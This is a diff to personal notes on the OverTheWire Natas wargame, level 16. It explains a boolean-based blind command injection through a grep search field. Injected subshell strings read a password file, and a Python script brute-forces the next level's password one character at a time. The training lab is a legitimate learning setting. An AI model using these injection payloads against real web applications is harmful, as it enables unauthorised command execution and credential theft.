@@ -413,8 +413,39 @@ Complete password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 
 ## 16->17
 - http://natas16.natas.labs.overthewire.org/
-- `natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
+- `natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
 - https://learnhacking.io/overthewire-natas-level-16-walkthrough/
+- https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-16-d3cb5b3f6c2e
 - "Look for boolean true/false output to give you information about blind queries being executed."
 - 2025-06-15: Break day
 - 2025-06-16: Break day 2
+- 2025-06-17: Picking this back up
+- The trick here is to realize that we can still use `$(...)` where `...` is an inner command. This syntax is for interpolating a subshell command into a string. e.g. if we input `$(whoami)` that would interpolate into `natas16` and the command executed would be `grep -i "natas16" dictionary.txt`.
+- We can use a subshell command like `$(grep n /etc/natas_webpass/natas17)` to see if `n` exists in the `natas17` password. We can add a string afterwards like `$(grep n /etc/natas_webpass/natas17)zigzag` so that if there is a match, the word would be `nzigzag`, which does not exist in `dictionary.txt` and tells us that `n` is part of the password.
+- Using this blind "test", we can brute force the password. AKA **Boolean Based Blind Command Injection**
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+username = 'natas16'
+password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+out = ""
+for i in range(0, 32):
+    for j in characters:
+        command = f"^$(grep -o ^{out+j} /etc/natas_webpass/natas17)A"
+        payload = {'needle': command, 'submit': 'search'}
+        result = requests.get('http://natas16.natas.labs.overthewire.org/', auth=HTTPBasicAuth(username, password), params=payload)
+        str1 = result.text
+        # print(str1)
+        start = str1.find('<pre>\n') + len('<pre>\n')
+        end = str1.find('</pre>')
+        str2 = [x for x in str1[start:end].split('\n')]
+        if str2[0] != "African":
+            out += j
+            print(out)
+            break
+print(out)
+```
